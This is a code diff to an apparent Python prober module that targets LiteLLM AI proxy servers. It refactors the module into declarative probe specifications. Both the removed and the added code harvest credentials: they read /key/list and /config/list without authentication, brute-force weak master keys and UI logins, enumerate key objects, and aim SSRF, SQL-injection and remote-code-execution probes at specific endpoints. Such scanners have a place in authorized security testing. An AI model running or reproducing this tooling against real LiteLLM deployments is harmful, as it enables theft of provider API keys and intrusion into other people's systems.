@@ -1,13 +1,4 @@
-"""LiteLLM prober — key list + config dump.
-
-LiteLLM proxy exposes:
-  - GET /health → health check (confirms it's LiteLLM)
-  - GET /key/list → list all API keys (requires master_key as auth)
-  - GET /v1/models → model list (sometimes unauthenticated)
-  - GET /config/list → full proxy config with provider API keys (needs admin)
-
-Weak-password: LiteLLM ships with admin user, password = master_key.
-"""
+"""LiteLLM prober — key list + config dump + master-key weak auth."""
 
 from __future__ import annotations
 
@@ -16,9 +7,81 @@ from typing import Any
 
 from aipocket.core.models import Credential
 
-from ..base import WEAK_CREDENTIALS, Prober
+from ..base import Prober
+from ..capability import ProbeSpec, RiskLevel, VulnClass
+from ._l2l3 import rce_spec, sqli_spec, ssrf_spec
 
 log = logging.getLogger(__name__)
+
+SPECS = [
+    ProbeSpec(
+        id="litellm.unauth",
+        product="litellm",
+        vuln_class=VulnClass.UNAUTH_READ,
+        risk_level=RiskLevel.L0,
+        entry={
+            "paths": ["/v1/models", "/health", "/key/list", "/config/list"],
+            "tag_prefix": "litellm_unauth",
+        },
+        max_requests=5,
+    ),
+    ProbeSpec(
+        id="litellm.weak_password",
+        product="litellm",
+        vuln_class=VulnClass.WEAK_PASSWORD,
+        risk_level=RiskLevel.L1,
+        entry={
+            # master_key as Bearer, then UI login with litellm_ prefix
+            "auth_style": "hybrid",
+            "bearer_paths": ["/key/list", "/config/list"],
+            "login": "/sso/key/generate",
+            "body": {"username": "{user}", "password": "{pass}"},
+            "password_prefix": "litellm_",
+            "token_fields": ["key", "token", "api_key"],
+            "post_auth_paths": ["/key/list", "/config/list"],
+        },
+        max_requests=16,
+    ),
+    ProbeSpec(
+        id="litellm.idor.keys",
+        product="litellm",
+        vuln_class=VulnClass.IDOR,
+        risk_level=RiskLevel.L1,
+        requires_auth=True,
+        depends_on=("litellm.weak_password",),
+        entry={
+            "list": "/key/list",
+            "object": "/key/info?key={id}",
+            "id_enum_max": 5,
+            "id_fields": ["token", "key", "key_name", "id"],
+            "use_auth": True,
+        },
+        max_requests=6,
+    ),
+    ssrf_spec(
+        "litellm",
+        path="/health/test_connection",
+        url_param="api_base",
+        body={"model": "gpt-3.5-turbo", "mode": "chat"},
+        use_auth=True,
+        suffix="ssrf_test_connection",
+    ),
+    sqli_spec(
+        "litellm",
+        path="/key/info",
+        param="key",
+        method="GET",
+        use_auth=True,
+        suffix="sqli_key_info",
+    ),
+    rce_spec(
+        "litellm",
+        path="/utils/dotproduct",
+        param="code",
+        use_auth=True,
+        suffix="rce_utils",
+    ),
+]
 
 
 class LiteLLMProber(Prober):
@@ -30,61 +93,4 @@ class LiteLLMProber(Prober):
         return "litellm" in blob or "x-litellm" in blob
 
     async def probe(self, hit: dict[str, Any]) -> list[Credential]:
-        creds: list[Credential] = []
-
-        # 1. Unauthenticated endpoints
-        for path in ("/v1/models", "/health", "/key/list", "/config/list"):
-            resp = await self._get(self._url(hit, path))
-            found = self._extract_from_response(
-                resp, hit, f"litellm_unauth_{path.strip('/').replace('/', '_')}"
-            )
-            creds.extend(found)
-
-        # 2. Try weak passwords as master_key in Authorization header
-        # LiteLLM uses the master key as both admin password and API auth.
-        for _, password in WEAK_CREDENTIALS if self._intrusive_authorized(hit) else ():
-            for path in ("/key/list", "/config/list"):
-                resp = await self._get(
-                    self._url(hit, path),
-                    headers={"Authorization": f"Bearer {password}"},
-                )
-                found = self._extract_from_response(
-                    resp, hit, f"litellm_weak_{path.strip('/').replace('/', '_')}"
-                )
-                if found:
-                    creds.extend(found)
-                    break  # this password works, no need to retry same path
-
-        # 3. SSO/UI login → get session token → read keys
-        token = await self._try_ui_login(hit) if self._intrusive_authorized(hit) else ""
-        if token:
-            for path in ("/key/list", "/config/list"):
-                resp = await self._get(
-                    self._url(hit, path),
-                    headers={"Authorization": f"Bearer {token}"},
-                )
-                found = self._extract_from_response(
-                    resp, hit, f"litellm_authed_{path.strip('/').replace('/', '_')}"
-                )
-                creds.extend(found)
-
-        return creds
-
-    async def _try_ui_login(self, hit: dict[str, Any]) -> str:
-        url = self._url(hit, "/sso/key/generate")
-        if not url:
-            return ""
-        for username, password in WEAK_CREDENTIALS:
-            resp = await self._post(
-                url, json={"username": username, "password": f"litellm_{password}"}
-            )
-            if resp is None or resp.status_code != 200:
-                continue
-            try:
-                data = resp.json()
-            except ValueError:
-                continue
-            key = data.get("key") or data.get("token") or data.get("api_key") or ""
-            if key:
-                return key
-        return ""
+        return await self.run_specs(hit, SPECS)
